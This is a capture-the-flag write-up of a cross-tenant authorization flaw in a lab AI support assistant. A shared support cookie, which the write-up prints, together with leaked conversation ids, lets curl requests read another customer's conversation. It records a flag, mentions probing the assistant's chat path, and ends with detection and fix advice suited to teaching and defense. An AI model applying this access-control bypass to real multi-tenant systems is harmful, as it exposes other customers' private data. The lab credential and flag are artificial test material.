# K23.2 — The conversation reference

> **Category:** 2. KeplerOps · **Points:** 50 · **Difficulty:** easy
> **Solved by:** pi lane K23

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Dangling cross-tenant reference — a retained selection in one customer's case points at a conversation belonging to another customer, and the conversation route serves it |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `GET https://assistant.keplerops.test/api/conversations/CONV-RILL-442-8` |
| **Prerequisite** | The support overlay cookie (`fieldkest_support=fk_support_rowan_…`) plus the conversation id from the open inventory (K23.1) |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how following a *reference* out of the ARWC support case lands
in Rillhaven's conversation, why the customer binding is the answer the card wants, and what a
missing tenant check on the conversation route means for the whole overlay.

## Objective

> A retained support artifact refers to a conversation outside the current case. Recover the
> actual reference and its customer binding.

So: start from the ARWC case scope, follow the pointer (`SEL-SUP-2841-12` →
`ATT-DIAG-698` → case `SUP-2841`, tenant `TEN-ARWC-047`), find that the referenced conversation
is `CONV-RILL-442-8`, and read it to confirm which customer it actually belongs to
(`TEN-RILL-022`).

## Background you need

**Cross-references are normal; unvalidated cross-references are not.** A support agent working
two tenants in one shift, or a diagnostic attachment shared between a supplier and a utility,
can produce a selection that legitimately names another conversation. The bug is not the
existence of the reference — it is that the *read* of the referenced object does not re-check
the caller's tenant.

**Selections.** In this assistant a selection is a stored pointer: it records which attachment
or conversation an answer was drawn from (`SEL-SUP-2841-12` → `ATT-DIAG-698`). It is provenance
metadata, and provenance is exactly what an investigator (or attacker) follows.

**Binding vs containment.** "Conversation X belongs to tenant Y" is a data field. "The caller may
read conversation X" is an authorization decision. If only the first exists, possession of the
id plus any valid support session is enough — which is how this card chains off K23.1's open
inventory.

## Walkthrough

### 1. Read the map

K23.1 gives you both contexts and their conversation ids without authentication:

```bash
curl -sS https://assistant.keplerops.test/api/contexts \
  | jq '.contexts // . | keys'
# ctx-support-private-v4, ctx-rill-support-v3
```

`ctx-support-private-v4` (workspace `support-private`) lists conversation
`CONV-SUP-2841-19` and document `DOC-RILL-442`; `ctx-rill-support-v3`
(workspace `rill-support`, tenant `TEN-RILL-022`) lists conversation `CONV-RILL-442-8`.

### 2. Get the overlay cookie

The conversation routes need the support bearer presented as a cookie:

```bash
TOKEN=fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b
C="Cookie: fieldkest_support=${TOKEN}"
```

### 3. Follow the reference out of the ARWC case

The retained selection from the ARWC ticket is the artefact that points elsewhere:

```
SEL-SUP-2841-12  ->  ATT-DIAG-698  ->  case SUP-2841, tenant TEN-ARWC-047
                                    ->  references CONV-RILL-442-8
```

Nothing about `SUP-2841` suggests Rillhaven. That is the anomaly: an ARWC case's retained
selection carries a Rillhaven conversation id.

### 4. Read the referenced conversation

```bash
curl -sS -H "$C" \
  https://assistant.keplerops.test/api/conversations/CONV-RILL-442-8 | jq
```

The response is a retained conversation with its customer binding attached:

```json
{
  "id": "CONV-RILL-442-8",
  "tenant": "TEN-RILL-022",
  "workspace": "rill-support",
  "messages": [ "…" ]
}
```

`tenant: TEN-RILL-022` — a different customer from the case we started in. The binding is the
deliverable: it proves the reference crosses the tenant boundary rather than being an internal
ARWC artefact.

### 5. Getting the flag

The conversation response carried the flag. Lane notes record it as
`FLAG{25723607dbdb5768}` with the submission accepted; the card stores no value, so it is
recorded here as accepted/not recorded. (This is the same value the K21 lane saw when it fetched
every conversation with the cookie — different card, different submission.)

## Why this works (the vulnerability explained)

The conversation route authorises on the **overlay session**, not on the conversation's tenant:

```
check:  is the caller a support overlay session?      -> yes (shared bearer)
check:  does this conversation id exist?              -> yes
absent: does conversation.tenant match the caller's case/tenant?  -> never evaluated
```

Because the overlay bearer is a single shared support credential (not per-agent, not per-tenant),
"a support session" implies "every tenant's conversations". The only thing protecting another
customer's transcript is the unguessability of its id — and K23.1 publishes the ids
unauthenticated, so even that is gone.

The cross-tenant *reference* is the second half. Stored provenance (`SEL-SUP-2841-12`) creates a
graph edge from the ARWC case to the Rillhaven conversation. Systems routinely validate the
edge at write time (an agent legitimately linked them) and never at read time, so the edge
survives as a permanent bridge between tenants. That is the pattern to remember: **a reference
is an authorization claim, and it has to be re-validated every time it is dereferenced.**

## Detection and fix

- **Log signal:** conversation reads where `conversation.tenant != caller.tenant` (or where the
  caller's case does not own the conversation); one cookie reading conversations across tenants
  in sequence; conversation ids first seen in an unauthenticated inventory read.
- **Fix:** make the overlay session tenant-scoped; enforce `conversation.tenant ==
  caller.tenant` (or an explicit cross-tenant grant) on every read; validate selection targets
  at read time, not only at creation; and stop returning conversation ids in the open context
  inventory.
- **Data review:** enumerate all selections and check their targets' tenants — a cross-tenant
  edge in provenance metadata is a latent breach, even if nobody has walked it yet.

## Notes and dead ends

- Recorded facts: `CONV-RILL-442-8` is readable with the support cookie and returns
  `tenant: "TEN-RILL-022"` plus the flag; `SEL-SUP-2841-12` belongs to `ATT-DIAG-698` / case
  `SUP-2841` / tenant `TEN-ARWC-047`; the context inventory lists the conversation under
  `ctx-rill-support-v3`. The JSON shape above is illustrative.
- Do not confuse this conversation id with `CONV-SUP-2841-19` (ARWC, K21.2). Both are readable
  with the same cookie, both return flags, and the ids look similar enough to mix up.
- Reading the conversation is not the end of the chain: the same context/conversation pair will
  serve `DOC-RILL-442`'s full text in K23.3, and that route is much slower (30–45 s) — budget
  timeouts accordingly.
- The assistant's chat path (`stream-chat`) remains a dead end: `mode` is ignored and the
  workspace's `chatMode=automatic` wins, so you cannot make the model narrate its own context.
  The REST routes are the way in.
